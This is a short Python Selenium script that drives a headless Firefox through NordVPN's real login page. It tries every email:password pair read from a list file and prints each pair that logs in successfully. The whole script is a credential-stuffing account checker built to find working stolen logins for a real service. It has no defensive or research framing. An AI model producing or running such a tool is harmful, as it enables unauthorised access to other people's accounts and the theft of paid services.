from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.options import Options

opts = Options()
opts.headless = True



url = 'https://ucp.nordvpn.com/' 

def tryToLogin(email, password):
    driver = webdriver.Firefox(options=opts)
    driver.get(url)
    driver.implicitly_wait(10)
    email_box = driver.find_element_by_xpath("//*[@id=\"ucp_login_email_field\"]") 
    email_box.send_keys(email)
    pass_box = driver.find_element_by_xpath("//*[@id=\"ucp_login_password_field\"]")
    pass_box.send_keys(password)
    pass_box.send_keys(Keys.RETURN)
    driver.implicitly_wait(10)
    try:
        confirmation_box = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/form/div/div[3]/span[2]/span")
        print(f"---FAILED-- {email}:{password}")

    except NoSuchElementException:
        print(f"***gg*** {email}:{password}")

    driver.close()

with open('nord_vpn.txt', mode='r') as file:
    for line in file:
        try: 
            email, password = line.split(',')[0].split(':') # Change here depending on your input file. 
        except ValueError:
            continue
        
        tryToLogin(email, password)
